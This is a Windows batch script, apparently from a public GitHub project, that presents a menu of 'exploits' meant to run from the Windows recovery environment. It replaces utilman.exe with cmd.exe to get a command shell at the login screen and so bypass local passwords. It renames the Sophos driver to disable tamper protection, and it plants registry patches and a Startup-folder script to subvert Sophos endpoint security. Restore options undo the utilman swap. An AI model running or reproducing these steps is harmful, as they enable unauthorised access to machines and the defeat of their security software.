@echo off
setlocal enabledelayedexpansion

rem Crack Script Made by S1rDyn0
rem Contributors: Viren070

if /i "%CD:~0,2%" NEQ "X:" (
  color 0C
  cls
  echo                __
  echo               / _^)
  echo      _.----._/ /
  echo     /         /
  echo  __/ ^(  ^| ^(  ^|
  echo /__.-'^|_^|--^|_^|
  echo EXPLOIT ERROR... & echo:
  echo You must be in the Installer/Recovery environment to run this script!
  pause
  cls
  exit /b 1
) else (
  cls
  color 3F
  echo: & echo Proceed with caution, we do not take any responsibility for damage caused by this script.
  echo Credit to S1rDyno for the orginal script ^& Viren070 for contributing to improve it.
  echo: & echo https://github.com/S1rDyn0/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
  pause
)

:menu
color 07
cls
echo ^|==================================^|
echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
echo ^|                                  ^|
echo ^|  BUILD ^| Production      23.5.8  ^|
echo ^|==================================^| & echo: & echo:

echo +++++ Password Exploit
echo ^[1^] Local Password Exploit
echo ^[2^] Restore Password Exploit

echo: & echo +++++ Sophos Exploit
echo ^[3^] Disable Sophos Tamper Protection
echo ^[4^] Sophos Registry Exploit

echo: & echo +++++ Other
echo ^[5^] Show On-Screen Keyboard
echo ^[6^] Recover Files from Backup
echo ^[0^] Exit
echo: & echo: & echo:

set validOptions= 0 1 2 3 4 5 6
set /p crackType=^> 

set optionFound=false
for %%a in (%validOptions%) do (
  if %crackType%==%%a (
    set optionFound=true
  )
)

if not %optionFound%==true (
  echo Looks like that's an invalid option!
  ping 0.0.0.0 -n 5 > nul
  goto menu
)

color 0A


if %crackType% EQU 0 (
  color 07
  cls & echo Exiting...
  exit /b 1
)


if %crackType% EQU 1 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32" (
    echo System Directory Found

    echo Renaming utilman.exe to utilman.old
    ren C:\windows\system32\utilman.exe utilman.old || goto cmdFail

    echo Copying cmd.exe to utilman.exe
    copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto cmdFail

    echo -----------------------------------
    echo Exploit Completed ^| No errors
    pause

  ) else (
    echo Could not find System Directory... & echo:
    echo Failing Password Exploit
    goto cmdFail
  )
)


if %crackType% EQU 2 (
  cls
  echo Preparing restore...
  if /i exist "x:\sources\restore" ( echo Located restore folder ) else ( echo Could not find Restore Folder... & echo: & echo Failing Exploit & goto cmdFail )
  if /i exist "x:\sources\restore\cmd.exe" ( echo Command Prompt backup found ) else ( echo Could not find Command Prompt backup... & echo: & echo Failing Exploit & goto cmdFail )
  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & echo: & echo Failing Exploit & goto cmdFail )

  echo Restore files found! & echo: & echo Checking System files...
  if /i exist "c:\windows\system32" ( echo Located System folder ) else ( echo Could not find System Folder... & echo: & echo Failing Exploit & goto cmdFail )
  if /i exist "c:\windows\system32\utilman.old" ( echo Original utilman.exe file found ) else ( echo Could not find utilman.old... & echo: & echo Failing Exploit & goto cmdFail )
  if /i exist "c:\windows\system32\cmd.exe" ( echo Original cmd.exe file found ) else ( echo Could not find cmd.exe... & echo: & echo Failing Exploit & goto cmdFail )
  if /i exist "c:\windows\system32\utilman.exe" ( echo Exploit utilman.exe file found ) else ( echo Could not find exploited utilman... & echo: & echo Failing Exploit & goto cmdFail )

  echo All system files located! & echo: & echo Starting restore...
  echo Deleting exploited utilman.exe
  del C:\windows\system32\utilman.exe
  echo Renaming utilman.old to utilman.exe
  ren C:\windows\system32\utilman.old utilman.exe

  echo -----------------------------------
  echo Restore Completed ^| No errors
  pause
)


if %crackType% EQU 3 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32\drivers" (
    echo System Directory Found
    
    echo Renaming SophosED.sys to SophosED.sys.old
    ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto cmdFail

    echo -----------------------------------
    echo Exploit Completed ^| No errors
    pause

  ) else (
    color 0C
    echo Could not find System Directory... & echo:
    echo Sophos Tamper Protection Disable failed
    goto cmdFail
  )
)


rem Option 4 is for the Sophos registry hack. This will use xcopy to make a new folder at C:\SophosUtility
rem It will next copy the sophos folder inside that directory.
rem Then it will copy evoke.bat to C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup as shortcut creation requires vbs script and not good choice in recovery environment
rem this will run autorun.bat script located in C:\SophosUtility\Sophos\autorub.bat

if %crackType% EQU 4 (
  echo Preparing Patch...
  if /i exist "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" ( echo Located Startup folder ) else ( echo Could not find Startup folder... & echo: & echo Failing Registry Patch & goto cmdFail )
  if /i exist "x:\sources\sophos" ( echo Located Sophos folder ) else ( echo Could not find Sophos folder... & echo: & echo Failing Registry Patch & goto cmdFail )
  if /i exist "x:\sources\sophos\1EndpointDefense.reg" ( echo Located Registry Patch file 1/2 ) else ( echo Could not find Regsitry File number 1... & echo: & echo Failing Registry Patch & goto cmdFail )
  if /i exist "x:\sources\sophos\2SophosMCSAgent.reg" ( echo Located Registry Patch file 2/2 ) else ( echo Could not find Regsitry File number 2... & echo: & echo Failing Registry Patch & goto cmdFail )
  if /i exist "x:\sources\sophos\autorun.bat" ( echo Located Autorun Script ) else ( echo Could not find the Autorun Script... & echo: & echo Failing Registry Patch & goto cmdFail )
  
  echo Patch files located! & echo: & echo Starting Patch...
  echo Creating Patch folder
  mkdir C:\SophosUtility || goto cmdFail
  
  echo Copying patch files to target folder
  copy X\:sources\sophos C:\SophosUtility || goto cmdFail
  
  echo Copying evoker to autorun folder
  copy C:\SophosUtility\sophos\evoke.bat  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || goto cmdFail

  echo -----------------------------------
  echo Sophos Registry Patch Completed ^| No errors
  pause

)


if %crackType% EQU 5 (
  start "C:/windows/system32/osk.exe"
)


if %crackType% EQU 6 (
  cls
  echo Preparing restore...
  if /i exist "x:\sources\restore" ( echo Located restore folder ) else ( echo Could not find Restore Folder... & echo: & echo Failing Restore & goto cmdFail )
  if /i exist "x:\sources\restore\cmd.exe" ( echo Command Prompt backup found ) else ( echo Could not find Command Prompt backup... & echo: & echo Failing Restore & goto cmdFail )
  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & echo: & echo Failing Restore & goto cmdFail )
  
  echo Backup files located! & echo: & echo Starting restore...
  echo Deleting exploited utilman.exe
  del C:\windows\system32\utilman.exe || goto cmdFail
  echo Restoring utilman.exe...
  copy X:\sources\restore\utilman.exe C:\windows\system32\utilman.exe || goto cmdFail
  echo Deleting cmd.exe...
  del C:\windows\system32\cmd.exe || goto cmdFail
  echo Restoring cmd.exe...
  copy X:\sources\restore\cmd.exe C:\windows\system32\cmd.exe || goto cmdFail
  
  echo -----------------------------------
  echo Restore Completed ^| No errors
  pause
)
  

goto menu
:cmdFail
color 0C 
echo: & echo: & echo -----------------------------------
echo                __
echo               / _^)
echo      _.----._/ /
echo     /         /
echo  __/ ^(  ^| ^(  ^|
echo /__.-'^|_^|--^|_^|
echo Option ID %crackType% failed and you will be returning to the menu.
pause
goto menu
